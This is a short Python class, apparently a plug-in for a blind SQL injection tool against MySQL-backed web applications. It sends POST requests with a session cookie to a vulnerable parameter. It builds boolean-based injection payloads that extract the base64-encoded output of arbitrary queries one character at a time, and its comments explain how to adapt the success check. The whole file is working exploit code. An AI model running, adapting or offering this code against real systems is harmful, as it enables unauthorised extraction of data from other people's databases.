import requests
from strategies.abstract_strategy import AbstractStrategy

class MYSQLiStrategy(AbstractStrategy):
    def __init__(self, url):
        self.url = url

    def send_payload(self, payload, timeout=10):
        try:
            cookies = {"PHPSESSID": "XXXXXXXXX"}
            data = {"vuln_param": payload} 
            response = requests.post(self.url, data=data, cookies=cookies)
            response.raise_for_status() # Comment this if it always returns something else than 200 or if false state returns something else than 200
            # Here return True if the payload is executed without errors 
            # you can base it on the status code and remove raise_for_status above
            # or you sarch for a specific error message in the response text
            # or you can parse the response text if you know it does return a specific output at some place
            # you can also modify your payload to do a timebased, add timeout to request and put a return False in   
            return response.status_code == 200
        except Exception:
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"1' OR (SELECT LENGTH(TO_base64({cmd}))) >= {length};-- -"
    
    def create_char_check_payload(self, cmd, position, char_value):
        return f"1' OR ASCII(SUBSTRING(TO_BASE64(({cmd})),{position+1},1))={char_value}-- -"
    
    def create_char_less_than_payload(self, cmd, position, char_value):
        return f"1' OR ASCII(SUBSTRING(TO_BASE64(({cmd})),{position+1},1))<{char_value}-- -"